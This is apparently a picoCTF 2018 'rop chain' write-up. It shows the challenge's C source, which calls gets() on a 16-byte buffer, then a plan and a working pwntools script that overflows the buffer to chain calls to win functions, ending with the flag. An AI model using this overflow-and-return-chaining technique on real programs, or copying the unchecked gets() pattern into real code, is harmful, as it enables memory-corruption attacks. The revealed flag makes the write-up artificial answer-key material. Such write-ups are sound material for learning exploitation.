![title](imagse/title.png)

![hint](images/hint.png)

### rop.c

Lets break it down. Two variables win1 and win2 are declared false.
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdbool.h>

#define BUFSIZE 16

bool win1 = false;
bool win2 = false;
```

Calling win_function1() changes win1 to true and calling win_function2() with the argument 0xbaaaaaad changes win2 to true

```c
void win_function1() {
  win1 = true;
}

void win_function2(unsigned int arg_check1) {
  if (win1 && arg_check1 == 0xBAAAAAAD) {
    win2 = true;
  }
  else if (win1) {
    printf("Wrong Argument. Try Again.\n");
  }
  else {
    printf("Nope. Try a little bit harder.\n");
  }
}

void flag(unsigned int arg_check2) {
  char flag[48];
  FILE *file;
  file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(flag, sizeof(flag), file);
 
```

If we call the flag function with win1 and win2 as true with the argument 0xdeadbaad we will get our flag
```c 
  if (win1 && win2 && arg_check2 == 0xDEADBAAD) {
    printf("%s", flag);
    return;
  }
  else if (win1 && win2) {
    printf("Incorrect Argument. Remember, you can call other functions in between each win function!\n");
  }
  else if (win1 || win2) {
    printf("Nice Try! You're Getting There!\n");
  }
  else {
    printf("You won't get the flag that easy..\n");
  }
}
```

Our vulnerability we will be taking advantage of. Overflow gets and return to various functions but use vuln() to return to after completing those functions
```c
void vuln() {
  char buf[16];
  printf("Enter your input> ");
  return gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
}
```

## Strategy

1. Determine buffer amount required to control the return pointer
2. Collect the addresses of win_function1(), win_function2(), flag(), and vuln()
3. Build and send the first payload consisting of buf + win_function1() + vuln()
4. Build and send the second payload consisting of buf + win_function2() + vuln() + arg1(0xbaaaaaad)
5. Build and send the third payload consisting of buf + flag() + vuln() + arg2(0xdeadbaad)

### apple.py

```python
#!/usr/bin/env python

from pwn import *
import sys
argc = len(sys.argv)

context.log_level = 'critical'

#establish elf and collect addresses
e = ELF('./rop')
win1 = e.symbols['win_function1']
win2 = e.symbols['win_function2']
flag = e.symbols['flag']
vuln = e.symbols['vuln']

#store our args for later use
arg1 = 0xbaaaaaad
arg2 = 0xdeadbaad

# find buffer using pwn cyclic
# pwn cyclic 50 | strace ./rop
# --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x61616168} ---
# +++ killed by SIGSEGV +++
# Segmentation fault
# ~/ctf_writeups/pico2018/binary/rop_chain# pwn cyclic -l 0x61616168
# 28
buf = 28

#remote or local
if argc > 1:
	from getpass import getpass
	ssh = ssh(host='2018shell.picoctf.com', user='ems3t', password=getpass())
	p = ssh.process('rop', cwd='/problems/rop-chain_0_6cdbecac1c3aa2316425c7d44e6ddf9d')
else:
	p = process('./rop')


#build our pwn function
def pwn(ret1, ret2, arg):
	payload = ''
	payload+= 'A'*buf
	payload+= p32(ret1)
	payload+= p32(ret2)
	payload+= p32(arg)
	p.sendlineafter('> ', payload)

#send first payload to make win1=true
pwn(win1, vuln, 0)

#send second payload to make win2 = true
pwn(win2, vuln, arg1)

#send third payload to print flag
pwn(flag, vuln, arg2)

#print the stdout and close the program
print p.recvline()[:-1]
p.close()
```

<details>
	<summary>Flag</summary>

picoCTF{rOp_aInT_5o_h4Rd_R1gHt_536d67d1}
</details>